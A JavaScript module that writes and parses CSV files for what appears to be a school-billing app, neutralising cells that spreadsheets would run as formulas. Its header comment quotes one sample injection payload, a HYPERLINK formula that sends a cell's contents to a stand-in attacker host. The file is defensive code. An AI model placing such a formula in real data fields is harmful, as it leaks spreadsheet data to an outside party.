/**
 * csv.js
 * ─────────────────────────────────────────────────────────────
 * CSV serialisation and parsing with formula-injection protection.
 *
 * Spreadsheets execute a cell that begins with `= + - @`, or with a
 * tab / carriage return. Names, school names and payment references
 * are all attacker-influenceable in this app, so a student called
 *   =HYPERLINK("https://evil.example/?"&A1,"Invoice")
 * would otherwise run in the bursar's Excel the moment they open an
 * export. Every field is therefore quoted *and* neutralised.
 *
 * Quoting is RFC 4180 style so `parseCsvLine` can read our own
 * output back (the marks import round-trips a template we export).
 * ─────────────────────────────────────────────────────────────
 */

/** Characters that make a spreadsheet treat a cell as a formula. */
const RISKY_PREFIX = /^[=+\-@\t\r]/;

/**
 * Serialise one field: type-safe, quote-escaped and formula-neutralised.
 * A leading apostrophe is the spreadsheet convention for "this is text".
 */
export function csvCell(value) {
  const s = value === null || value === undefined ? '' : String(value);
  const neutralised = RISKY_PREFIX.test(s) ? `'${s}` : s;
  return `"${neutralised.replace(/"/g, '""')}"`;
}

/** One record (no line terminator). */
export function csvRow(values) {
  return values.map(csvCell).join(',');
}

/** A complete document — CRLF line endings, as RFC 4180 prefers. */
export function csvText(rows) {
  return rows.map(csvRow).join('\r\n');
}

/**
 * Parse a single CSV line, honouring quoted fields and doubled quotes.
 * Returns unquoted values in field order.
 */
export function parseCsvLine(line) {
  const out = [];
  let field = '';
  let inQuotes = false;

  for (let i = 0; i < line.length; i++) {
    const ch = line[i];
    if (inQuotes) {
      if (ch === '"') {
        if (line[i + 1] === '"') { field += '"'; i++; }   // escaped quote
        else inQuotes = false;
      } else {
        field += ch;
      }
    } else if (ch === '"') {
      inQuotes = true;
    } else if (ch === ',') {
      out.push(field); field = '';
    } else {
      field += ch;
    }
  }
  out.push(field);
  return out.map(v => v.trim());
}

/** Strip the protective apostrophe we add on export. */
export const unguard = (value) => String(value ?? '').replace(/^'/, '');

/** A UTF-8 BOM so Excel detects the encoding (paired with csvText). */
export const CSV_BOM = '\ufeff';
